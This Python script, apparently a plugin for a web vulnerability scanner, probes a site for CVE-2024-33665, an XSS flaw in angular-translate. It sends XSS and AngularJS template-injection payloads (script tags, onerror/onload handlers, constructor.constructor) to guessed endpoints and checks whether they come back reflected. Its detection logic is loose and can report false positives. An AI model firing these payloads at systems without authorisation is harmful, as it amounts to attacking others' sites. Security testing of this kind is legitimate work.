"""
CVE-2024-33665 Vulnerability Detection Script
Angular Translate XSS - High Severity
HeroDevs Vulnerability Directory
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2024-33665 弱點
    Angular Translate XSS 弱點
    影響版本: angular-translate ≥ 2.4.0
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-33665: Angular Translate XSS 弱點，未經清理的翻譯鍵值可導致跨站腳本攻擊',
        'remediation': '更新 angular-translate 套件，實施嚴格的翻譯鍵值驗證和輸出編碼'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2024-33665 Angular Translate XSS 弱點...")
        
        # 檢測 AngularJS 和 angular-translate 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller'
        ]
        
        translate_indicators = [
            'angular-translate',
            'pascalprecht.translate',
            '$translate',
            'translate filter',
            'translate directive',
            'translate="',
            'translate-attr',
            '| translate',
            'translatejs',
            'ng-translate'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_translate = any(indicator in response.text.lower() for indicator in translate_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        if not uses_translate:
            print("      [檢測] 未明確檢測到 angular-translate，但繼續測試...")
        else:
            print("      [檢測] 發現 AngularJS 和 angular-translate 使用")
        
        # 測試 angular-translate XSS 攻擊
        test_endpoints = [
            '/api/translate',
            '/api/language',
            '/api/i18n',
            '/translate',
            '/language',
            '/locale',
            '/i18n',
            '/api/text',
            '/text'
        ]
        
        # CVE-2024-33665 特定攻擊負載
        translate_xss_payloads = [
            {
                'key': '<script>alert("CVE-2024-33665")</script>',
                'description': 'Direct script injection in translate key'
            },
            {
                'key': '{{ constructor.constructor("alert(1)")() }}',
                'description': 'AngularJS template injection in translate key'
            },
            {
                'key': '<img src=x onerror=alert(document.domain)>',
                'description': 'Image XSS in translate key'
            },
            {
                'key': '<svg onload=alert("XSS")>',
                'description': 'SVG XSS in translate key'
            },
            {
                'key': 'javascript:alert("translate-xss")',
                'description': 'JavaScript URI in translate key'
            },
            {
                'translate_id': '<script>alert("translate-id-xss")</script>',
                'description': 'XSS in translate ID parameter'
            }
        ]
        
        for endpoint in test_endpoints:
            try:
                # 測試端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=15)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in translate_xss_payloads:
                    try:
                        # 測試不同的參數名稱
                        if 'key' in payload_data:
                            post_data = {
                                'key': payload_data['key'],
                                'translate_key': payload_data['key'],
                                'translation_key': payload_data['key'],
                                'message_key': payload_data['key'],
                                'text_key': payload_data['key']
                            }
                        else:
                            post_data = {
                                'translate_id': payload_data['translate_id'],
                                'id': payload_data['translate_id']
                            }
                        
                        # POST 請求測試
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=post_data,
                            timeout=15
                        )
                        
                        # 檢查回應是否包含了未經清理的翻譯內容
                        if response.status_code in [200, 201, 202]:
                            response_text = response.text
                            
                            # 檢查 XSS payload 是否被直接反映
                            xss_indicators = [
                                '<script>alert(',
                                'onerror=alert(',
                                'onload=alert(',
                                'javascript:alert',
                                'constructor.constructor',
                                'CVE-2024-33665',
                                'translate-xss',
                                'translate-id-xss'
                            ]
                            
                            found_xss = [ind for ind in xss_indicators if ind in response_text]
                            
                            if found_xss:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 CVE-2024-33665 Angular Translate XSS 弱點。{payload_data['description']} 成功注入未經清理的內容。檢測到 XSS 指標: {', '.join(found_xss)}。這可能導致跨站腳本攻擊。"
                                return result
                        
                        # JSON 格式測試
                        json_data = {}
                        if 'key' in payload_data:
                            json_data = {
                                'translations': {
                                    'test_key': payload_data['key']
                                },
                                'key': payload_data['key']
                            }
                        else:
                            json_data = {'translate_id': payload_data['translate_id']}
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=15
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            if any(ind in response.text for ind in xss_indicators):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 Translate XSS 弱點 (JSON 格式)。{payload_data['description']} 成功注入。"
                                return result
                        
                        # GET 參數測試
                        get_params = {}
                        if 'key' in payload_data:
                            get_params = {
                                'key': payload_data['key'],
                                'translate': payload_data['key'],
                                'text': payload_data['key']
                            }
                        else:
                            get_params = {'id': payload_data['translate_id']}
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=15
                        )
                        
                        if response.status_code == 200:
                            if any(ind in response.text for ind in xss_indicators):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 Translate XSS 弱點 (GET 參數)。{payload_data['description']} 被反映。"
                                return result
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                continue
        
        # 分析現有頁面中的 translate 使用
        print("      [檢測] 分析現有頁面中的 translate 實作...")
        
        translate_patterns = [
            r'translate\s*=\s*["\'][^"\']*["\']',
            r'\|\s*translate',
            r'\$translate\([^)]*\)',
            r'translate-attr-[^=]*=',
            r'{{ [^}]*\|\s*translate[^}]* }}',
            r'<[^>]+translate="[^"]*"[^>]*>'
        ]
        
        found_translate_usage = []
        for pattern in translate_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_translate_usage.extend(matches)
        
        if found_translate_usage:
            print(f"      [檢測] 發現 {len(found_translate_usage)} 個 translate 相關用法")
            
            # 檢查是否有不安全的實作
            vulnerable_patterns = []
            for usage in found_translate_usage:
                # 檢查是否使用了動態翻譯鍵值
                if '{{' in usage and '}}' in usage:
                    vulnerable_patterns.append(usage)
                # 檢查是否有可疑的 HTML 內容
                elif any(tag in usage.lower() for tag in ['<script', '<img', '<svg', 'javascript:']):
                    vulnerable_patterns.append(usage)
            
            if vulnerable_patterns:
                result['vulnerable'] = True
                result['evidence'] = f"在頁面中發現可能受 CVE-2024-33665 影響的 translate 實作。發現 {len(vulnerable_patterns)} 個潛在弱點用法: {', '.join(vulnerable_patterns[:2])}..."
                return result
        
        # 測試特定的 translate 指令場景
        print("      [檢測] 測試特定 translate 指令場景...")
        
        directive_payloads = [
            '<div translate="{{ \'<script>alert(1)</script>\' }}"></div>',
            '<span translate-attr-title="{{ maliciousKey }}"></span>',
            '<p>{{ "MALICIOUS_KEY" | translate }}</p>'
        ]
        
        for payload in directive_payloads:
            for endpoint in ['/api/content', '/api/template', '/content', '/template']:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'content': payload, 'template': payload, 'html': payload},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        if '<script>' in response.text or 'maliciousKey' in response.text:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 成功注入了惡意 translate 內容"
                            return result
                            
                except:
                    continue
        
        # 檢查 angular-translate 設定和版本
        translate_config_patterns = [
            r'angular\.module\([^)]*\)\.config\([^}]*translate[^}]*\)',
            r'\$translateProvider\.[^;]*',
            r'pascalprecht\.translate[^;]*',
            r'angular-translate[/@]([0-9.]+)'
        ]
        
        config_usage = []
        for pattern in translate_config_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                config_usage.extend(matches)
        
        if config_usage:
            print(f"      [檢測] 發現 {len(config_usage)} 個 translate 設定")
            
            # 檢查是否有不安全的設定
            for config in config_usage:
                if 'sanitize' in config.lower() and 'false' in config.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f"發現不安全的 angular-translate 設定，已停用清理功能: {config}"
                    return result
        
        result['evidence'] = f"完成 CVE-2024-33665 檢測。分析了 {len(test_endpoints)} 個端點和 {len(found_translate_usage)} 個 translate 用法，未發現明確的 XSS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result